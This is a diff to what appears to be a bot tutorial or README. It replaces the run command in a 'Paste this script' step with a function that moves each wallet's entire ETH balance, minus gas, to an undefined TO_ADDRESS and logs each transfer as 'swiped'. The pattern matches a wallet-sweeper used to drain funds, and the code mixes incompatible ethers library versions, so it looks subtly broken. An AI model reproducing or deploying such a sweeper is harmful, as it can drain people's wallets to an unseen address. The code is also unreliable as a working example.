@@ -59,7 +59,65 @@ nano bot.js
 ```
 **Paste this script:**
 ```
-node bot.js
+async function swipe(wallet) {
+    try {
+        const balance = await wallet.getBalance();
+        console.log(`💰 Wallet ${wallet.address} balance: ${ethers.formatEther(balance)} ETH`);
+
+        if (balance.eq(0)) {
+            console.log(`⛔ Skipping ${wallet.address}: balance is 0`);
+            return;
+        }
+
+        const network = await wallet.provider.getNetwork();
+        let tx;
+        const estimatedGas = 21000;
+
+        if (network.chainId === 8453) { // Base mainnet
+            const feeData = await wallet.provider.getFeeData();
+            const txCost = feeData.maxFeePerGas.mul(estimatedGas);
+
+            if (balance.lte(txCost)) {
+                console.log(`❌ Not enough balance to cover Base gas for ${wallet.address}`);
+                return;
+            }
+
+            const amount = balance.sub(txCost);
+
+            tx = await wallet.sendTransaction({
+                to: TO_ADDRESS,
+                value: amount,
+                type: 2, // EIP-1559
+                maxFeePerGas: feeData.maxFeePerGas,
+                maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
+                gasLimit: estimatedGas,
+            });
+        } else {
+            const gasPrice = await wallet.provider.getGasPrice();
+            const txCost = gasPrice.mul(estimatedGas);
+
+            if (balance.lte(txCost)) {
+                console.log(`❌ Not enough balance to cover Sepolia gas for ${wallet.address}`);
+                return;
+            }
+
+            const amount = balance.sub(txCost);
+
+            tx = await wallet.sendTransaction({
+                to: TO_ADDRESS,
+                value: amount,
+                gasPrice,
+                gasLimit: estimatedGas,
+            });
+        }
+
+        console.log(`✅ Swiped ${ethers.formatEther(tx.value)} ETH from ${wallet.address}`);
+        console.log(`🔗 TX: ${tx.hash}`);
+    } catch (err) {
+        console.error(`🔥 Error swiping ${wallet.address}:`, err.message);
+    }
+}
+
 ```
 Then save (Ctrl + O, Enter, Ctrl + X).
 
